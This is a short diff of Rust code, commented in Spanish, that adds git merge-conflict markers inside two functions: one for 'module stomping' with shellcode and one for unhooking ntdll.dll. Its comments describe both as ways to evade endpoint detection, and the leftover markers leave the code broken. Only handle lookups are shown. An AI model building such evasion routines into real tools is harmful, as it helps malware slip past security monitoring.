@@ -160,7 +160,12 @@ pub mod module_stomping {
     /// Bypasses detección de DLL injection tradicional
     pub unsafe fn stomp_module(target_module: &str, shellcode: &[u8]) -> Result<(), String> {
         // Obtener handle del módulo target
+<<<<<<< HEAD
         let module_name = CString::new(target_module).map_err(|_| "Invalid module name")?;
+=======
+        let module_name = CString::new(target_module)
+            .map_err(|_| "Invalid module name")?;
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         let module_handle = GetModuleHandleA(module_name.as_ptr());
         if module_handle.is_null() {
@@ -264,7 +269,12 @@ pub mod unhook {
     /// Remueve hooks de ntdll.dll restaurando desde disco
     pub unsafe fn unhook_ntdll() -> Result<(), String> {
         // Cargar una copia limpia de ntdll.dll desde disco
+<<<<<<< HEAD
         let ntdll_name = CString::new("ntdll.dll").map_err(|_| "Failed to create CString")?;
+=======
+        let ntdll_name = CString::new("ntdll.dll")
+            .map_err(|_| "Failed to create CString")?;
+>>>>>>> c91d9a7f4ae0e377b6e588ce3dd50af442df4b6f
 
         let clean_ntdll = LoadLibraryA(ntdll_name.as_ptr());
         if clean_ntdll.is_null() {
